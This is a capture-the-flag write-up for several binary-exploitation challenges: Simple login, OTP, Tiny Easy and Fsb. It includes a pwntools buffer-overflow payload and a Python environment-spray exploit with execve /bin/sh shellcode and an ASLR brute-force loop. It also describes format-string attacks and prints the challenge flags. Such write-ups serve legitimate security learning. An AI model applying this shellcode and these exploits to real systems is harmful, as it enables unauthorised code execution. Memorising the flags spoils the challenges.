#### Simple login

```
from pwn import *
import base64
payload = pack(0xdeadbeef)+pack(0x804925f)+pack(0x811eb40)
print  base64.encodestring(payload)
```

There was a memcpy in auth()  which lead to overflow of ebp , then eip = *(ebp+4) now we place &correct() in our payload which is 
stored in global variable 

##### flag :control EBP, control ESP, control EIP, control the world~

#### OTP 

this had no vuln i know , but apparently u have to use ulimit -f 0 so the passcode file is not created and we can enter '' password
but i still wonder why we have to use subprocces.Popen(['otp',''],stderr=stdout)

#### Tiny Easy

this prog just executed our argv[0] and it had aslr ON , using execv we can give argv[0] whatever we want , and to bypass aslr
we <b> spray the stack with environment variable </b>

```
import os
import struct

shellcode="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
nopsled = "\x90"*4096;  
payload = nopsled+shellcode

myenv = {}  
for i in range(0,100):  
	myenv["spray"+str(i)] = payload

#envaddr = pack(0xffff3ead)
envaddr = struct.pack("<I",0xff8402c7)

while True:
	print "trying ...."
	p = subprocess.Popen([envaddr], executable="./tiny_easy", env=myenv)
	p.wait()
````
##### flag: What a tiny task :) good job!

#### Fsb 
it was a format string bug , and program asks u to guess a key(random val) ,there are 3 ways to solve problem : <br> 
    1) Leak key ( i did ,but problem is stroull is treadted as int if <stdlib.h> is not included ) <br>
    2) Overwrite key ( it takes a lot of time to print , u had to redirect to > /dev/null ) <br>
    3) Change the control flow ( which i have to try ) <br>
    
##### flag :Have you ever saw an example of utilizing [n] format character?? :(    
    





